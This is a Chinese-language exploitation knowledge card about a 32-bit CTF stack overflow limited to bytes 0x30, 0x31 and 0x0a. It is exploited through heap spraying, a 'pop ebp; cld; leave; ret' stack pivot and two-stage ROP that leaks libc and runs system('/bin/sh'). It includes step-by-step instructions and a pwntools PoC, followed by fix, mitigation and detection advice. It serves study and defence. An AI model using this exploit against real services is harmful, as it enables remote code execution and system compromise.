---
id: binary-pwn-stack-restricted-char-overflow-heap-spray-pivot-32bit
title: 32 位受限字符栈溢出 + 堆喷 + pop ebp;cld;leave;ret 栈迁移：仅用 0x30/0x31/0x0a 字节构造 ROP 绕过 ASLR
type: scenario
domain: binary
path: binary/pwn/stack
technique: restricted-char-stack-overflow-heap-spray-pivot
tags:
- pwn
- stack-overflow
- 32bit
- restricted-bytes
- heap-spray
- stack-pivot
- rop
- aslr-bypass
- http-parser
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V181
  verified_at: '2026-11-06T17:43:11+08:00'
  notes: 已对照原文核对：CCB strspn 限制字符、0x202 次 0x10000 堆喷、pop ebp;cld;leave;ret 迁移与 0x0a303030 落点均与原文/截图一致；修正 alias 0x0a303030 被 YAML 数值化为 170930224 的问题。未复跑 4097 次堆喷利用，栈偏移/堆喷命中需按目标调整。
url: /docs/binary/pwn/stack/binary-pwn-stack-restricted-char-overflow-heap-spray-pivot-32bit/
draft: false
kb_aliases:
- CVE-2025-22457 思路
- 字符型溢出
- CCB 溢出
- strspn 字符限制
- '0x0a303030'
- 32 位堆喷
- pop ebp cld leave ret
- HTTP 头栈溢出
---

## 一句话结论

32 位服务解析 HTTP 风格头部时，`CCB` 值经 `strspn(value,"01\n")` 计算长度后 `memcpy` 进 50 字节栈缓冲区，溢出字节被限制为 `0x30/0x31/0x0a`；由于无法直接写任意 gadget 地址，利用重复的 `0x0a303030`（"000\n"）配合约 32 MB 堆喷覆盖该地址，再用 `pop ebp; cld; leave; ret` 把栈迁到堆上的 ROP 链，即可在 32 位非 PIE 目标上绕过 ASLR 完成利用。

## 原理

- **受限字符溢出的来源**：`check_htp()` 对每个头部做键值解析，遇到 `CCB` 时执行 `num = strspn(start_ptr, "01\n")`，再 `memcpy(dest, start_ptr, num)`，`dest` 只有 50 字节。`num` 未与 `sizeof(dest)` 取最小值，超长 CCB 值直接溢出栈。
- **可写字节集极窄**：`strspn` 只统计连续属于 `{'0','1','\n'}` 的字节，所以实际能写进栈的只有 `0x30`、`0x31`、`0x0a`。任意 gadget 地址（如 `0x080493a3`）包含其他字节，无法直接写进 saved EBP/RET，也无法写 `\x00`。
- **可用的唯一常量**：四个字节 `30 30 30 0a` 组成 dword `0x0a303030`（即字符串 `"000\n"`），这是该字节集下少有的可作为指针/落点的值。把栈帧覆盖成大量 `0x0a303030`，再用固定的 `pop ebp; cld; leave; ret` gadget：`pop ebp` 取到受控值，`cld` 只清方向标志不崩溃，`leave; ret` 完成迁移。
- **32 位堆喷覆盖落点**：64 位地址空间太大不适合盲喷，但 32 位进程的堆/mmap 区域有限。通过 `/alloc` 申请约 `0x202` 个 `0x10000` 块，再加 `0x1000`、`0x4000` 块，填充约 32 MB，使 `0x0a303030` 稳定落在攻击者可控的堆数据中；`/add` 把 0x4000 字节的 ROP 载荷写进该区域，形成可被迁移到的“假栈”。
- **两级 ROP**：迁移后第一段 ROP 调 `read(0, 0x0a303030, 0x500)` 写入第二段链，并用 `puts(printf@got)` 泄露 libc，随后计算 `system` 并执行 `/bin/sh`。由于 ASLR/堆布局存在不确定性，文章用 4097 次重试提高命中率；这是本地验证的利用，原文未提供远程目标。
- **为什么 `cld` 不破坏链**：`cld` 清 DF，只影响字符串指令方向，不影响后续 `pop`/`ret`；它是该 gadget 恰好包含的“无害填充”，使 `pop ebp` 和 `leave; ret` 能连续执行。

## 触发条件

- 32 位、非 PIE（或已泄漏代码基址）的本地/服务程序，具有 HTTP 风格解析逻辑与 `CCB` 头处理；`strspn` 结果直接作为 `memcpy` 长度且目标栈缓冲区小于可写长度。
- 程序提供可控的大块分配/写入路由（示例 `/alloc`、`/add`），可用于堆喷与放置 ROP 载荷。
- 存在 `pop ebp; cld; leave; ret`（或等价可迁移 gadget），地址固定；溢出能覆盖 saved EBP/RET。
- 允许重复连接/重试（堆喷命中与 ASLR 有概率性）；原文只在本地复现，无远程服务。

## 利用步骤

1. 逆向后确认 `check_htp` 的 CCB 分支：`num = strspn(value, "01\n")`、`memcpy(dest, value, num)`、`dest[50]`；确认可写字节集只有 `0x30/0x31/0x0a`。
2. 确认二进制为非 PIE，找 `pop ebp; cld; leave; ret`、`leave; ret`、`read@plt`、`puts@plt` 与 GOT 地址。
3. 堆喷：`/alloc 0x10000` 重复约 `0x202` 次，再分配 `0x1000×5`、`0x4000×1`，让 `0x0a303030` 落入可控堆区。
4. `/add` 发送 0x4000 字节 ROP 载荷（含第一段 read、libc 泄露、system 链），载荷用 `\n` 填充到目标长度。
5. `/test` 发送 `CCB: '1'*0x82 + '000\n'`；`'1'` 填充到 saved frame，`"000\n"` 写入 `0x0a303030` 触发 `pop ebp; cld; leave; ret` 迁移。
6. 迁移后第一段链 `read` 第二段 ROP；`puts` 泄露 libc，计算 `system` 后拿 shell。
7. 若布局/ASLR 未命中则重启重试（文章脚本循环 4097 次）。

## PoC

关键载荷与触发（完整脚本较长，地址取自文章示例，需按目标重查）：

```python
from pwn import *

pop_ebp_cld_leave_ret = 0x080493a3
leave_ret             = 0x08049215
pop_ebx_ret           = 0x0804901e
read_plt              = elf.plt.read
puts_plt              = elf.plt.puts
printf_got            = elf.got.printf

# 1) 约 32 MB 堆喷，覆盖 0x0a303030
trigger_alloc(io, 0x10000, 0x202)
trigger_alloc(io, 0x1000, 5)
trigger_alloc(io, 0x4000, 1)

# 2) 在堆上布置 ROP 假栈
payload  = p32(0x0a303030) * ((0xe10 - 0x15c) // 4)
payload += p32(0x080CD0C0)
payload += p32(0x0a303030) * ((0x15c - 0x38) // 4)
payload += p32(leave_ret)                       # 栈迁移
payload += p32(0x0a303030) * (0x30 // 4)
payload += p32(0x0a303030)
payload += p32(pop_ebp_cld_leave_ret)           # pop ebp; cld; leave; ret
payload += p32(0x0a303030 + 8)
payload += p32(read_plt) + p32(0) + p32(0) + p32(0x0a303030) + p32(0x500)
payload = payload.ljust(0x4000, b'\n')
trigger_add(io, length=0x4000, data=payload)

# 3) 受限字符溢出，写入 0x0a303030 并触发迁移
trigger_ccb_test(io, ccb_value='1' * 0x82 + '000\n')

# 4) 第二段 ROP：泄露 libc 后 system("/bin/sh")
payload  = p32(0x0804901e + 1) * 0x10
payload += p32(puts_plt) + p32(pop_ebx_ret) + p32(printf_got)
payload += p32(read_plt) + p32(0) + p32(0) + p32(0x0a303030) + p32(0x500)
io.send(payload)
libc.address = u32(io.recv(4)) - libc.sym.printf
```

`0x0a303030` 必须由堆喷覆盖为可控数据，否则迁移后崩溃；`'1'*0x82` 的长度与 `"000\n"` 的偏移需按目标栈帧调整。文章的目标函数是本地 HTTP 协议封装，`/alloc`、`/add`、`/test` 为示例路由。

## 变体与关联

- **CVE-2025-22457**：Ivanti Connect Secure 的 `X-Forwarded-For` 头栈溢出是同类真实案例——头部值受字符集/解析限制，32 位地址空间下用堆喷和栈迁移绕过 ASLR；本卡是该思路在 CTF 协议题上的复现，不声称复现该 CVE 的具体产品代码。
- **无堆喷变体**：若可写字节集更大或允许写 `\x00`，可直接覆盖返回地址走 ret2libc/ret2syscall，无需堆喷；若为 64 位，地址空间过大，堆喷不再现实，应改用 64 位字符串溢出/任意写思路（见 [[binary-pwn-stack-string-overflow-pointer-freehook]]、[[binary-pwn-stack-controlled-pointer-memcpy-environ-orw]]）。
- 关联：[[binary-pwn-stack-pivot-leave-ret-bss]]（leave;ret 迁移原理）、[[binary-pwn-stack-tls-ssl-struct-overwrite-32bit-pie-heap-spray]]（32 位堆喷占位）、[[binary-pwn-stack-ret2syscall-32bit]]（32 位 syscall ROP）。
- 边界：该利用依赖非 PIE 固定 gadget、堆喷覆盖固定地址、进程可重试；开启 PIE/64 位/堆随机化后需更换策略。

## 检测与防御

- 代码修复：`memcpy` 长度与目标缓冲区取最小值（`min(num, sizeof(dest)-1)`），不要用 `strspn` 结果直接当拷贝长度；对头部值做长度上限校验。
- 缓解：32 位服务尽量编译为 PIE、开启完整 ASLR/NX/RELRO；限制单次连接的分配次数与总堆大小，降低堆喷覆盖固定地址的可行性。
- 检测：短时间大量 `/alloc` 请求、`CCB` 头出现超长连续 `'1'` 与 `"000\n"`、进程反复崩溃重启；HTTP 解析器日志中出现异常头部长度。
- 事件响应：此类栈溢出通常直接导致 RCE，需重启服务、排查同网段横向与持久化。
